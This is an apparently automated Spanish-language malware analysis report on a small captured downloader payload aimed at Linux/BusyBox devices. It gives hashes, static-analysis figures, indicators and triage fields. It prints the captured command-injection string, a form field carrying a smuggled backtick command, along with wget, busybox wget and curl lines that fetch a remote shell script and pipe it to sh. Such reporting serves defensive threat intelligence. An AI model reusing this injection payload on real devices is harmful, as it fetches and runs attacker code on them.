# 🧬 Payload Analysis

`9be8067aea0dba0ec5fb559b4506cddc414ae4c0062cf9e6d05de0d350d9efa2`

## 📌 Resumen

Texto ASCII de 242 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `sh -s lunblkv`
2. `busybox wget hxxp://91.92.40.XXX/wget.sh -O-`
3. `curl hxxp://91.92.40.XXX/wget.sh`
4. `wget hxxp://91.92.40.XXX/wget.sh -O-` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/9be8067aea0dba0ec5fb559b4506cddc414ae4c0062cf9e6d05de0d350d9efa2.md](../../../../../malware-like/oraculo/downloader/9be8067aea0dba0ec5fb559b4506cddc414ae4c0062cf9e6d05de0d350d9efa2.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `9be8067aea0dba0ec5fb559b4506cddc414ae4c0062cf9e6d05de0d350d9efa2`
- **SHA1:** `2ea65993d2821a76d6a0c3353767c4995a5b5c77`
- **MD5:** `94f4560a6181ee6fe58fc661cc57b849`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 242 B |
| Entropía | 4.94 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
ttcp_num=3&ttcp_size=3&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lunblkv%60 | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | ttcp_num=3&ttcp_size=3&ttcp_ip=-h+%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lunblkv%3Bbusybox% | strings |
| hash | 9be8067aea0dba0ec5fb559b4506cddc414ae4c0062cf9e6d05de0d350d9efa2 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
